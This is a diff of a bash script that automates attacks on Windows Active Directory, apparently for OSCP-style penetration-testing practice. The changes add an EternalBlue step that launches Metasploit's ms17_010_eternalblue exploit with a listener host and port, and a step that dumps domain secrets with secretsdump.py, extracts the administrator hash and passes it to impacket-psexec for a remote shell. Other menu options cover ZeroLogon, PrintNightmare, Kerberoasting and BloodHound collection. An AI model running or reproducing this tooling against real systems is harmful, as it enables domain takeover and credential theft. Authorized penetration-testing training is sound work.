@@ -5,11 +5,7 @@
 # Script will save output to the domainip.txt file, for ldap it will create a new directory (nobody reads scripts anyways)
 # Thanks for using!
 
-echo -e '\E[31;40m' "Made by OvergrownCarrot1, thanks for using"
-echo ""
-echo -e '\E[31;35m' "This script looks at other tools, you need impacket, feroxbuster and crackmapexec downloaded and in $PATH to work correctly"
-echo ""
-echo -e '\E[31;35m' "If you do not know all the information below then leave blank, the more information the more enumeration will happen, may need to run multiple times and check the $DOMAINIP.txt file for more information"; tput sgr0
+echo -e '\E[32;35m' "If you do not know all the information below then leave blank, the more information the more enumeration will happen, may need to run multiple times and check the $DOMAINIP.txt file for more information"; tput sgr0
 echo ""
 echo -e '\E[31;35m' "Anything that is needed to be downloaded is downloaded with Kali distro in mind, if you use another distro do it yourself..."
 echo ""
@@ -35,13 +31,9 @@ read USER
 echo -e '\E[31;40m' "Password"; tput sgr0
 read PASS
 
-read -p "If you do not have a userfile already would you like to try GetADUsers.py to make a userfile (NOTE: WILL NEED A USER AND PASS FILLED OUT ABOVE)? (y/n):" answer
-if [ $answer = y ] ; then
-	GetADUsers.py $DOMAIN/$USER:$PASS -all -ts -dc-ip $DOMAINIP > $DOMAINIP.users.txt
-	echo -e '\E[31;40m' "Saved to $DOMAINIP.users.txt"
-elif [ $answer = n ] ; then
-	echo -e '\E[31;40m' "User File if any"; tput sgr0
-	read USERFILE
+echo -e '\E[31;40m' "User File"; tput sgr0
+read USERFILE
+
 else
 	echo ""
 fi
@@ -85,10 +77,11 @@ echo "
 2)  SMB Killer 
 3)  Kerberoasting / Kerbrute you pick
 4)  ZeroLogon 
-5)  PrintNightmare (Need to run Rustscan or NMAP first)
+5)  PrintNightmare
 6)  Run bloodhound-python (needs to be installed, if not installed run Download Tools first)
-7)  Listen to some NIN
+7)  EternalBlue (like OMG... that still exists...)
 8)  SecretsDump (Need Username and Password)
+n)  Listen to some NIN
 z)  Run the whole script (Will do the above and much more)
 99) exit
 "
@@ -144,6 +137,15 @@ elif [ $answer = 1 ] ; then
 		sudo apt install ldapdomaindump
 	else 
 		echo "Not downloading crackmapexec"
+	fi
+
+	which neo4j
+
+	if [ $? -ne 0 ]; then
+		echo "Downloading neo4j"
+		sudo apt -y install neo4j
+	else
+		echo "Not downloading neo4j"
 	fi
 	
 	read -p "The kerbrute that is needed for this script is kerbrute_linux_amd64 or kerbrute_linux_386, do you need this version downloaded (y/n):"
@@ -240,13 +242,40 @@ elif [ $answer = 5 ]; then
 		echo -e '\E[31;40m' "Need a y or n"; tput sgr0
 		fi
 	fi
-elif [ $answer = 6 ]; then
-	echo -e '\E[31;40m' "Username?";tput sgr0
-	read BLOODUSER
-	echo -e '\E[31;40m' "Password?"; tput sgr0
-	read BLOODPASS
-	bloodhound-python -u BLOODUSER -p BLOODPASS -ns $DOMAINIP -d $DOMAIN -c all
+elif [ $answer = 6 ] && [ $USER ] && [ $PASS ] && [ $DOMAIN ] && [ $DOMAINIP ]; then
+	mkdir blood
+	cd blood
+	bloodhound-python -u $USER -p $PASS -ns $DOMAINIP -d $DOMAIN -c all
+	which neo4j
+	if [ $? -ne 0 ]; then
+		echo "Come on man you need neo4j, here you go"
+		sudo apt install -y neo4j
+		echo  -e '\E[31;40m' "Starting neo4j, your job is to start bloodhound"; tput sgr0
+		sudo neo4j console
+	else
+		echo "neo4j already installed, starting"
+		echo  -e '\E[31;40m' "Starting neo4j, your job is to start bloodhound"; tput sgr0
+		sudo neo4j console
+	fi
 elif [ $answer = 7 ]; then
+	if grep "CVE:CVE-2017-0143" $DOMAINIP.txt
+	then
+		echo -e '\E[31;40m'"Most likley vulnerable to Eternal Blue";tput sgr0
+		read -p "Would you like to automatically exploit Eternal Blue with Metasploit? MAY NOT BE ALLOWED FOR OSCP (y/n)" answer
+		if [ $answer = y ] ; then
+			echo "LHOST?"
+			read LHOST
+			echo "LPORT?"
+			read LPORT
+			msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; set LHOST $LHOST;set RHOSTS $DOMAINIP; set LPORT $LPORT; exploit"
+		fi
+	fi
+elif [ $answer = 8 ] && [ $USER ] && [ $PASS ] && [ $DOMAIN ] ; then
+	echo -e '\E[31;35m' "Saving everything to secretsdump.txt"; tput sgr0
+	secretsdump.py "$DOMAIN/$USER:$PASS"@$DOMAINIP > secretsdump.txt
+	hash=$(cat secretsdump.txt | sed '6q;d' | cut -d ':' -f 3,4)
+	impacket-psexec -hashes $hash administrator@$DOMAINIP
+elif [ $answer = n ]; then
 read -p "Lets start off with the important questions NIN? (Not streamer friendly since that is like a thing or something) (y/n):" answer
 	if [ $answer = y ] ; then
 		read -p "My Homie... what song (closer(c)/perfect(p)/head(he)/hand(ha))?" answer
@@ -265,11 +294,6 @@ read -p "Lets start off with the important questions NIN? (Not streamer friendly
 	else 
 		echo "I am not going to type out every song, come on man"
 	fi
-elif [ $answer = 8 ] && [ $USER ] && [ $PASS ] && [ $DOMAIN ] ; then
-	echo -e '\E[31;35m' "Saving everything to secretsdump.txt"; tput sgr0
-	secretsdump.py "$DOMAIN/$USER:$PASS"@$DOMAINIP > secretsdump.txt
-	hash=$(cat secretsdump.txt | sed '6q;d' | cut -d ':' -f 3,4)
-	impacket-psexec -hashes $hash administrator@$DOMAINIP 
 elif [ $answer = z ]; then
 	echo -e '\E[31;35m' "Doing an update first to make sure we can find all files"; tput sgr0
 	sudo apt update
